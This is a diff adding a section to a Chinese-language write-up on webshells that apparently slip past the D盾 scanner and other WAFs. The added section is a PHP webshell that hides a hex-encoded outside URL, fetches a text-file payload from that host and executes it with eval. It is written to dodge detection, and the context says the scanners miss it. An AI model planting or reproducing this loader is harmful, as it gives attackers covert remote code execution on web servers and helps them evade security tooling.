@@ -311,6 +311,16 @@ D盾_Web查杀
 
 其他几个Waf也是查杀不出的，篇幅有限，就不演示了。
 
+### remote2
+```php
+    <?php
+    $s9 = "687474703A2F2F7033733232373538752E626B742E636C6F7564646E2E636F6D2F73396D662E747874";
+    $m="s9";  //远程URL进行hex编码
+    $f = file_get_contents(PACK('H*',$$m));
+    eval($f);
+```
+
+### remote3
 
 
 
